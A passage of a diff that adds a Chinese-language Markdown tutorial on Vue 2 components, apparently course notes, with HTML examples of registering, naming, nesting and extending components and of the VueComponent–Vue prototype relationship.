+				</div>
+			`,
+			// el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
+			data(){
+				return {
+					schoolName:'尚硅谷',
+					address:'北京昌平'
+				}
+			},
+			methods: {
+				showName(){
+					alert(this.schoolName)
+				}
+			},
+		})
+
+		//第一步：创建student组件
+		const student = Vue.extend({
+			template:`
+				<div>
+					<h2>学生姓名：{{studentName}}</h2>
+					<h2>学生年龄：{{age}}</h2>
+				</div>
+			`,
+			data(){
+				return {
+					studentName:'张三',
+					age:18
+				}
+			}
+		})
+		
+		//第一步：创建hello组件
+		const hello = Vue.extend({
+			template:`
+				<div>	
+					<h2>你好啊！{{name}}</h2>
+				</div>
+			`,
+			data(){
+				return {
+					name:'Tom'
+				}
+			}
+		})
+		
+		//第二步：全局注册组件
+		Vue.component('hello',hello)
+
+		//创建vm
+		new Vue({
+			el:'#root',
+			data:{
+				msg:'你好啊！'
+			},
+			//第二步：注册组件（局部注册）
+			components:{
+				school,
+				student
+			}
+		})
+
+		new Vue({
+			el:'#root2',
+		})
+	</script>
+</html>
+```
+
+### 2. 几个注意点
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>几个注意点</title>
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 
+			几个注意点：
+					1.关于组件名:
+								一个单词组成：
+											第一种写法(首字母小写)：school
+											第二种写法(首字母大写)：School
+								多个单词组成：
+											第一种写法(kebab-case命名)：my-school
+											第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
+								备注：
+										(1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
+										(2).可以使用name配置项指定组件在开发者工具中呈现的名字。
+
+					2.关于组件标签:
+								第一种写法：<school></school>
+								第二种写法：<school/>
+								备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。
+
+					3.一个简写方式：
+								const school = Vue.extend(options) 可简写为：const school = options
+		-->
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h1>{{msg}}</h1>
+			<school></school>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false
+		
+		//定义组件
+		const s = Vue.extend({
+			name:'atguigu',
+			template:`
+				<div>
+					<h2>学校名称：{{name}}</h2>	
+					<h2>学校地址：{{address}}</h2>	
+				</div>
+			`,
+			data(){
+				return {
+					name:'尚硅谷',
+					address:'北京'
+				}
+			}
+		})
+
+		new Vue({
+			el:'#root',
+			data:{
+				msg:'欢迎学习Vue!'
+			},
+			components:{
+				school:s
+			}
+		})
+	</script>
+</html>
+```
+
+### 3. 组件的嵌套
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>组件的嵌套</title>
+		<!-- 引入Vue -->
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 准备好一个容器-->
+		<div id="root">
+			
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+		//定义student组件
+		const student = Vue.extend({
+			name:'student',
+			template:`
+				<div>
+					<h2>学生姓名：{{name}}</h2>	
+					<h2>学生年龄：{{age}}</h2>	
+				</div>
+			`,
+			data(){
+				return {
+					name:'尚硅谷',
+					age:18
+				}
+			}
+		})
+		
+		//定义school组件
+		const school = Vue.extend({
+			name:'school',
+			template:`
+				<div>
+					<h2>学校名称：{{name}}</h2>	
+					<h2>学校地址：{{address}}</h2>	
+					<student></student>
+				</div>
+			`,
+			data(){
+				return {
+					name:'尚硅谷',
+					address:'北京'
+				}
+			},
+			//注册组件（局部）
+			components:{
+				student
+			}
+		})
+
+		//定义hello组件
+		const hello = Vue.extend({
+			template:`<h1>{{msg}}</h1>`,
+			data(){
+				return {
+					msg:'欢迎来到尚硅谷学习！'
+				}
+			}
+		})
+		
+		//定义app组件
+		const app = Vue.extend({
+			template:`
+				<div>	
+					<hello></hello>
+					<school></school>
+				</div>
+			`,
+			components:{
+				school,
+				hello
+			}
+		})
+
+		//创建vm
+		new Vue({
+			template:'<app></app>',
+			el:'#root',
+			//注册组件（局部）
+			components:{app}
+		})
+	</script>
+</html>
+```
+
+### 4. VueComponent
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>VueComponent</title>
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 
+			关于VueComponent：
+						1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。
+
+						2.我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，
+							即Vue帮我们执行的：new VueComponent(options)。
+
+						3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！
+
+						4.关于this指向：
+								(1).组件配置中：
+											data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
+								(2).new Vue(options)配置中：
+											data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。
+
+						5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
+							Vue的实例对象，以后简称vm。
+		-->
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<school></school>
+			<hello></hello>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false
+		
+		//定义school组件
+		const school = Vue.extend({
+			name:'school',
+			template:`
+				<div>
+					<h2>学校名称：{{name}}</h2>	
+					<h2>学校地址：{{address}}</h2>	
+					<button @click="showName">点我提示学校名</button>
+				</div>
+			`,
+			data(){
+				return {
+					name:'尚硅谷',
+					address:'北京'
+				}
+			},
+			methods: {
+				showName(){
+					console.log('showName',this)
+				}
+			},
+		})
+
+		const test = Vue.extend({
+			template:`<span>atguigu</span>`
+		})
+
+		//定义hello组件
+		const hello = Vue.extend({
+			template:`
+				<div>
+					<h2>{{msg}}</h2>
+					<test></test>	
+				</div>
+			`,
+			data(){
+				return {
+					msg:'你好啊！'
+				}
+			},
+			components:{test}
+		})
+
+
+		// console.log('@',school)
+		// console.log('#',hello)
+
+		//创建vm
+		const vm = new Vue({
+			el:'#root',
+			components:{school,hello}
+		})
+	</script>
+</html>
+```
+
+### 5. 一个重要的内置关系
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>一个重要的内置关系</title>
+		<!-- 引入Vue -->
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 
+				1.一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype
+				2.为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。
+		-->
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<school></school>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+		Vue.prototype.x = 99
+
+		//定义school组件
+		const school = Vue.extend({
+			name:'school',
+			template:`
+				<div>
+					<h2>学校名称：{{name}}</h2>	
+					<h2>学校地址：{{address}}</h2>	
+					<button @click="showX">点我输出x</button>
+				</div>
+			`,
+			data(){
+				return {
+					name:'尚硅谷',
+					address:'北京'
+				}
+			},
+			methods: {
+				showX(){
+					console.log(this.x)
+				}
+			},
+		})
+
+		//创建一个vm
+		const vm = new Vue({
+			el:'#root',
+			data:{
+				msg:'你好'
+			},
+			components:{school}
+		})
+
+		
+		//定义一个构造函数
+		/* function Demo(){
+			this.a = 1
+			this.b = 2
+		}
+		//创建一个Demo的实例对象
+		const d = new Demo()
+
+		console.log(Demo.prototype) //显示原型属性
+
+		console.log(d.__proto__) //隐式原型属性
+
+		console.log(Demo.prototype === d.__proto__)
+
+		//程序员通过显示原型属性操作原型对象，追加一个x属性，值为99
+		Demo.prototype.x = 99
+
+		console.log('@',d) */
+
+	</script>
+</html>
+```
 
